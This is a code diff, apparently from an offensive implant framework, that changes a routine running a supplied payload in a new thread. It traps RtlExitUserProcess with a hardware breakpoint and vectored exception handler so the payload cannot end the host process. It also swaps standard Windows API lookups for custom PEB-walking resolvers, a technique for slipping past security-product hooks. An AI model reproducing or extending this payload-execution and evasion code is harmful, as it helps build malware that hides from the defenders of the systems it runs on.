@@ -20,7 +20,11 @@
 #include <io.h>
 #include <fcntl.h>
 
+#include <peb.hpp>
+#include <hwbp.hpp>
+
 #include <syscall.hpp>
+
 #endif
 
 #define BUFSIZE 512
@@ -421,18 +425,9 @@ LONG WINAPI handlerRtlExitUserProcess(EXCEPTION_POINTERS * ExceptionInfo)
 {
 	if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) 
 	{
-		BYTE* baseAddress = (BYTE*)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlExitUserProcess");
+		BYTE* baseAddress = (BYTE*)xGetProcAddress(xGetLibAddress((PCHAR)"ntdll.dll", TRUE, NULL), (PCHAR)"RtlExitUserProcess", 0);
 		if (ExceptionInfo->ContextRecord->Rip == (DWORD64) baseAddress) 
-		{
-			// printf("[!] Exception (%#llx)! Params:\n", ExceptionInfo->ExceptionRecord->ExceptionAddress);
-			// printf("(1): %#d | ", ExceptionInfo->ContextRecord->Rcx);
-			// printf("(2): %#llx | ", ExceptionInfo->ContextRecord->Rdx);
-			// printf("(3): %#llx | ", ExceptionInfo->ContextRecord->R8);
-			// printf("(4): %#llx | ", ExceptionInfo->ContextRecord->R9);
-			// printf("RSP = %#llx\n", ExceptionInfo->ContextRecord->Rsp);
-			
-			// printf("RtlExitUserProcess called!\n");
-			
+		{			
 			// continue the execution
 			ExceptionInfo->ContextRecord->EFlags |= (1 << 16);			// set RF (Resume Flag) to continue execution
 			//ExceptionInfo->ContextRecord->Rip++;						// or skip the breakpoint via instruction pointer
@@ -502,10 +497,15 @@ int AssemblyExec::createNewThread(const std::string& payload, std::string& resul
 	
 	HANDLE thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) ptr, NULL, CREATE_SUSPENDED, 0);
 
-	AddVectoredExceptionHandler(0, &handlerRtlExitUserProcess);
+	// AddVectoredExceptionHandler(0, &handlerRtlExitUserProcess);
+	// BYTE* baseAddress = (BYTE*)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlExitUserProcess");
+	// DWORD64 dword64Address = reinterpret_cast<uintptr_t>(baseAddress);
+	// SetHWBP(thread, (DWORD64) dword64Address, TRUE);
+
 	BYTE* baseAddress = (BYTE*)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlExitUserProcess");
-	DWORD64 dword64Address = reinterpret_cast<uintptr_t>(baseAddress);
-	SetHWBP(thread, (DWORD64) dword64Address, TRUE);
+	HANDLE phHwBpHandler;
+	int indexHWBP;
+	set_hwbp(thread, baseAddress, handlerRtlExitUserProcess, indexHWBP, &phHwBpHandler);
 
 	if (thread != NULL) 
 		ResumeThread(thread);
